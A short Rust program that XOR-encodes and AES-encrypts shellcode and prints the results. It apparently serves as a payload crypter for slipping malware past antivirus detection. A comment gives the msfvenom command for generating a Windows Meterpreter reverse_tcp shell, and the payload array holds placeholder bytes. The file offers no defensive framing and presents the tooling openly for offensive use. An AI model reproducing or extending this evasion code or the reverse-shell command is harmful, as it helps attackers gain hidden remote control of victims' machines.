use libaes::Cipher;
use itertools::Itertools;

fn main() {
    //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f csharp
    let shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];


    //change keys
    let xor_shellcode: Vec<u8> = xor_encode(&shellcode, 0xDA); 
    let aes_shellcode: Vec<u8>= aes_256_encrypt(&shellcode, b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337", b"This is 16 bytes");

    println!("XOR Shellcode: {:#x}", xor_shellcode.iter().format(", "));
    println!();
    println!();
    println!("AES Shellcode: {:#x}", aes_shellcode.iter().format(", "));
}

fn xor_encode(shellcode: &Vec<u8>, key: u8) -> Vec<u8> {
    shellcode.iter().map(|x| x ^ key).collect()
}

fn aes_256_encrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    // Create a new 128-bit cipher
    let cipher = Cipher::new_256(key);

    // Encryption
    let encrypted = cipher.cbc_encrypt(iv, shellcode);

    encrypted
}